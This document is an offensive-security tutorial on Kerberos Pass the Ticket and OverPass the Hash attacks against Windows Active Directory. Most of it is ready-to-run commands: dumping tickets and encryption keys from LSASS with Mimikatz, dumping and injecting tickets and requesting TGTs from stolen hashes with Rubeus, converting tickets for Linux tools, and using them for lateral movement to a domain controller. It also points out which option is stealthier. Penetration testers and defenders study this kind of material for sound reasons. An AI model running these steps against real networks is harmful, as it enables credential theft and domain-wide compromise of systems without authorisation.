A Pass the Ticket attack abuses the fact that **Kerberos trusts tickets, not passwords**. If an attacker obtains a valid Kerberos ticket, Windows will accept it as proof of identity, regardless of how it was obtained.

There are two relevant ticket types:

- **TGT (Ticket Granting Ticket)**: allows requesting service tickets for any service the user is authorized to access.
- **TGS (Service Ticket)**: allows access to a specific service (e.g., CIFS, LDAP, HTTP).

On Windows systems, Kerberos tickets are handled and stored by **LSASS**.  
This means **local administrator privileges** are required to dump or manipulate tickets belonging to other users.

---

## Harvesting Kerberos Tickets
First, is necessary gaining access to a ticket, this could be achieved using Mimikatz or Rubeus.

### Mimikatz
The following commands create multiple `.kirbi` files on disk. Once exported, these tickets can be reused on the same or another system.

```powershell
.\mimikatz.exe
privilege::debug
sekurlsa::tickets /export
```

## Rubeus

Rubeus can dump tickets **without writing files to disk**, outputting them in **Base64** instead:

```powershell
.\Rubeus.exe dump /nowrap
```

This is often preferred for stealth. The Base64 output represents the same `.kirbi` ticket format.

---

## Pass the Ticket 

### Mimikatz

To inject a ticket into the current logon session:

```powershell
kerberos::ptt C:\path\to\ticket.kirbi
```

After injection, Windows will automatically use the ticket for authentication.

Verification:

```powershell
klist
```

If the ticket is listed, authentication is active and can be used immediately.

### Rubeus

Inject a ticket directly from Base64:

```powershell
.\Rubeus.exe ptt /ticket:<Base64Ticket>
```

Or inject a `.kirbi` file:

```powershell
.\Rubeus.exe ptt /ticket:ticket.kirbi
```

Verification:

```powershell
klist
```

Once injected, the ticket is immediately usable for lateral movement.


### Lateral Movement with Injected Tickets

Once a ticket is injected (via Mimikatz or Rubeus), authentication is automatic:

```powershell
dir \\DC01.example.local\c$
```

If the ticket belongs to a privileged user, this enables full lateral movement across the domain.

#### Pass the Ticket from Linux

After obtaining a Kerberos the ticket can also be moved to Kali. The ticket must be converted to a `ccache` file and exported so Linux tools can use it.

```bash
# Convert .kirbi to ccache
impacket-ticketConverter ticket.kirbi ticket.ccache
# Export the Kerberos ticket
export KRB5CCNAME=./ticket.ccache
```

Then, commands can be executed:

```bash
netexec smb dc01.example.local -u user -k --no-pass
```

> The **password field is not used**. Authentication is done entirely with the Kerberos ticket loaded in memory.

---

## OverPass the Hash (Pass the Key) 

Traditional Pass the Hash uses NTLM hashes directly. Instead, **OverPass the Hash** converts a **hash or Kerberos key** into a **valid TGT**, bridging NTLM credential theft and Kerberos authentication.

This works because Kerberos accepts valid encryption keys (RC4, AES128, AES256) during ticket requests.

### Mimikatz
#### Extracting Kerberos Keys Mimikatz

To retrieve Kerberos encryption keys from memory:

```powershell
sekurlsa::ekeys
```

This reveals key material such as:

- `rc4_hmac` (NTLM-based)
    
- `aes128_hmac`
    
- `aes256_hmac`
    

These keys can be used to forge tickets.

#### OverPass the Hash 

Create a new logon session using the NTLM hash:

```powershell
sekurlsa::pth /domain:example.local /user:user /ntlm:<NTLM_HASH>
```

This spawns a new `cmd.exe` with a valid Kerberos TGT for that user.  
From this shell, any Kerberos-authenticated service can be accessed.

### Rubeus

Rubeus can request a TGT directly using a hash or Kerberos key.

Using AES256 (preferred in modern domains):

```powershell
.\Rubeus.exe asktgt /domain:example.local /user:alice /aes256:<AES256_KEY> /nowrap
```

To immediately inject the ticket:

```powershell
.\Rubeus.exe asktgt /domain:example.local /user:alice /rc4:<NTLM_HASH> /ptt
```

This requests and imports the TGT in one step.

---

## Pass the Ticket with PowerShell Remoting 

Once a valid Kerberos ticket (TGT) has been injected into the current logon session, PowerShell Remoting can be used for lateral movement without providing credentials. WinRM relies on Kerberos by default in Active Directory environments, so if a usable ticket is present, Windows will automatically authenticate using it.

After injecting the ticket with Mimikatz or Rubeus, start PowerShell from the same session and connect to the remote host:

```powershell
Enter-PSSession -ComputerName DC01.example.local
```

If the ticket is valid and the user has PowerShell Remoting permissions (local admin or member of **Remote Management Users**), an interactive remote session is established immediately.

Verification inside the session:

```powershell
whoami
hostname
```
